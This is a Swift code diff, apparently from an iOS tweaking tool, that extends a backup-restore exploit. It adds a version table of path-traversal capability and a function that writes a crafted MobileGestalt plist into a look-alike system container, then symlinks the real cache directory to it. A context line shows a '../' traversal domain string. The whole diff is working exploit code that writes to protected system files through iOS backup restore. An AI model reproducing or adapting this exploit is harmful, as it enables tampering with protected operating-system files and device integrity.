@@ -1,5 +1,11 @@
 import Foundation
 
+enum PathTraversalCapability: Int {
+    case unsupported = 0 // 18.2b3+, 17.7.2
+    case dotOnly // 18.1b5-18.2b2, 17.7.1
+    case dotAndSlashes // up to 18.1b4, 17.7
+}
+
 class FileToRestore {
     var contents: Data
     var to: URL
@@ -21,6 +27,14 @@ class FileToRestore {
 }
 
 struct Restore {
+    static func supportedExploitLevel() -> PathTraversalCapability {
+        if #available(iOS 18.1, *) {
+            return .dotOnly
+        } else {
+            return .dotAndSlashes
+        }
+    }
+    
     static func createBypassAppLimit() -> Backup {
         let deviceList = MobileDevice.deviceList()
         guard deviceList.count == 1 else {
@@ -51,6 +65,21 @@ struct Restore {
         
         files.append(ConcreteFile(path: "", domain: "SysContainerDomain-../../../../../../../../crash_on_purpose", contents: Data()))
         return Backup(files: files)
+    }
+    
+    static func createMobileGestalt(file: FileToRestore) -> Backup {
+        Backup(files: [
+            Directory(path: "", domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcachf"),
+            Directory(path: "Library", domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcachf"),
+            Directory(path: "Library/Caches", domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcachf"),
+            ConcreteFile(
+                path: "Library/Caches/com.apple.MobileGestalt.plist",
+                domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcachf",
+                contents: file.contents,
+                owner: file.owner,
+                group: file.group),
+            SymbolicLink(path: "", domain: "SysSharedContainerDomain-systemgroup.com.apple.mobilegestaltcache", target: "systemgroup.com.apple.mobilegestaltcachf")
+        ])
     }
     
     static func createBackupFiles(files: [FileToRestore]) -> Backup {
